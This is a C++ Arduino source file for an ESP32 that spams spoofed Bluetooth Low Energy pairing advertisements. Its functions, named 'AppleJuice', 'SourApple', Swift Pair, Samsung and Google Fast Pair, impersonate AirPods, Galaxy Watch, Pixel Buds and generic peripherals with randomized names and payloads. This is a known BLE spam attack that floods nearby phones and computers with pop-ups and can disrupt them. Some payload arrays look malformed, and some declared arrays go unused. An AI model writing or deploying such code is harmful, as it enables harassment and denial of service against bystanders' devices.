#include <Arduino.h>
#include <NimBLEDevice.h>

uint32_t spamInterval = 80;

const uint8_t appleJuice[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19};
const uint8_t sourApple[]  = {0x1e, 0xff, 0x4c, 0x00, 0x0f, 0x19, 0x00};
const uint8_t samsungData[] = {0x01, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00};
const char* windowsNames[] = {
    "Mouse", "Keyboard", "Headset", "Speaker", 
    "Printer", "Mouse", "BT Device", "Update"
};

void initBLE() {
    NimBLEDevice::init("");
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);
}

void sendAppleJuice() {
  NimBLEAdvertisementData adv;
  adv.setManufacturerData(std::string((char*)appleJuice, sizeof(appleJuice)));
  String name = "AirPods " + String(random(1,99));
  adv.setName(name.c_str());
  NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
  NimBLEDevice::getAdvertising()->start();
  delay(20);
  NimBLEDevice::getAdvertising()->stop();
}

void sendSourApple() {
  NimBLEAdvertisementData adv;
  uint8_t data[8] = {0x1e, 0xff, 0x4c, 0x00, 0x0f, 0x19, random(0,255), random(0,255)};
  adv.setManufacturerData(std::string((char*)data, 8));
  NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
  NimBLEDevice::getAdvertising()->start();
  delay(20);
  NimBLEDevice::getAdvertising()->stop();
}

void sendSwiftPair() {
  String names[] = {"Mouse", "Keyboard", "Headset", "Speaker", "Printer", "BT Device"};
  String name = names[random(0,6)] + " " + String(random(100,999));
  
  NimBLEAdvertisementData adv;
  adv.setName(name.c_str());
  
  uint8_t data[] = {0x02, 0x01, 0x1A, 0x0A, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80};
  adv.setManufacturerData(std::string((char*)data, sizeof(data)));
  
  NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
  NimBLEDevice::getAdvertising()->start();
  delay(60);
  NimBLEDevice::getAdvertising()->stop();
  
  Serial.println("→ SWIFT PAIR");
}

void sendSamsung() {
  uint8_t data[] = {0x01, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00};
  NimBLEAdvertisementData adv;
  adv.setManufacturerData(std::string((char*)data, sizeof(data)));
  String name = "Galaxy Watch " + String(random(1,9));
  adv.setName(name.c_str());
  
  NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
  NimBLEDevice::getAdvertising()->start();
  delay(70);
  NimBLEDevice::getAdvertising()->stop();
  
  Serial.println("→ SAMSUNG");
}

void sendRandomApple() {
  NimBLEAdvertisementData adv;
  uint8_t rnd[6] = {0x1e, 0xff, 0x4c, 0x00, random(0,255), random(0,255)};
  adv.setManufacturerData(std::string((char*)rnd, 6));
  NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
  NimBLEDevice::getAdvertising()->start();
  delay(15);
  NimBLEDevice::getAdvertising()->stop();
}

void sendGoogleFastPair() {
  uint8_t data[10] = {0x02, 0x01, 0x1A, 0x0A, 0xFF, 0xE0, 
                      (uint8_t)random(0,256), (uint8_t)random(0,256),
                      (uint8_t)random(0,256), (uint8_t)random(0,256)};
  
  NimBLEAdvertisementData adv;
  adv.setManufacturerData(std::string((char*)data, 10));
  adv.setName("Pixel Buds");
  
  NimBLEDevice::getAdvertising()->setAdvertisementData(adv);
  NimBLEDevice::getAdvertising()->start();
  delay(60);
  NimBLEDevice::getAdvertising()->stop();
  
  Serial.println("→ GOOGLE FAST PAIR");
}